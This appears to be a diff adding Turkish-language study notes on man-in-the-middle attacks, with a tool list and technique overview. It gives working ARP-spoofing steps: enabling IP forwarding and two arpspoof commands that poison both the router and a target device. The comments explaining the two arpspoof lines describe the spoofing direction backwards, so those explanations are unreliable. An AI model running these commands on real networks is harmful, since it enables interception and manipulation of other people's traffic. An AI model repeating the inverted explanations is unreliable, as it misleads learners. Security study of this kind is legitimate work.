@@ -1,0 +1,62 @@
+
+------------------------------------
+
+	MAN IN THE MIDDLE
+
+* İki cihaz arasındaki iletişime sızarak verileri dinlemek veya manipüle etmek için kullanılan bir saldırı yöntemidir.
+
+* MITM  saldırılarında kullanılan bazı araçlar :
+	- arpspoof
+	- mitm Framework (mitmf)
+	- ettercap
+	- bettercap
+	- ...
+
+* Bu alanda geliştirilmiş ilk araçlardan biri "mitmf"dir. Ancak geliştirilmesi devam etmediği için güncelliğini kaybedip 
+yerini başka araçlara bırakmıştır.
+
+* MITM saldırısı, birçok farklı teknikle gerçekleştirilebilir :
+	- ARP Spoofing 		(Yerel ağlar için yaygın bir yöntemdir)
+	- DNS Spoofing 		(Yanıltıcı DNS yanıtlarıyla)
+	- WiFi Evil Twin 	(Sahte Wi-Fi ağı kurarak)
+	- SSL Stripping 	(HTTPS trafiğini HTTP'ye düşürerek)
+
+-----------------------------------
+
+	ARP SPOOFING NEDİR ?
+
+* ARP spoofing, saldırganın kendisini hem modem hem de hedef cihaz olarak tanıtarak iki cihaz arasındaki iletişimi 
+yönlendirmesi ve manipüle etmesi yöntemidir.
+
+------------------------------------
+
+	ARP SPOOF
+
+* Modemle modeme bağlı bir cihaz arasına girmek için her ikisini de kandırmamız gerekiyor
+	- Modem'e bağlı cihaza modemmiş gibi
+	- Modeme de ona bağlı cihazmış gibi
+
+* İp forvarding'i açmak için aşağıdaki ayarlamayı yapıyoruz. Normaldeki değeri 0'dır.
+	- echo 1 > /proc/sys/net/ipv4/ip_forward 
+	(Geçici bir değişikliktir, pc'yi aç kapa yaptığımızda eski haline döner.)
+	- Bu etkin olmazsa windows'larda internet bağlantısı kopabilir.
+
+* apt install dsniff
+	- arpspoof'u kuruyoruz
+	- Normalde kalilerde kurulu olarak gelir eğer kurulu gelmezse
+
+* arpspoof -i wlan0 -t 169.254.0.1  169.254.0.11		: .11'lu cihaza kendimizin .1'li cihaz olduğumuzu söylüyoruz (Hedef cihazı kandoroypruz)
+* arpspoof -i wlan0 -t 169.254.0.11 169.254.0.1 		: .1'lu cihaza kendimizin .11'li cihaz olduğumuzu söylüyoruz (Modemi kandırıyoruz)
+	-t : target adresi
+	> Her iki cihazı da kandırıyoruz
+
+NOT : ctrl + c yaptığımızda yavaş durur. Çünkü doğru bilgileri atıp durdurur.
+
+------------------------------------
+
+	KOMUTLAR
+
+* arp
+* arp -a
+
+------------------------------------
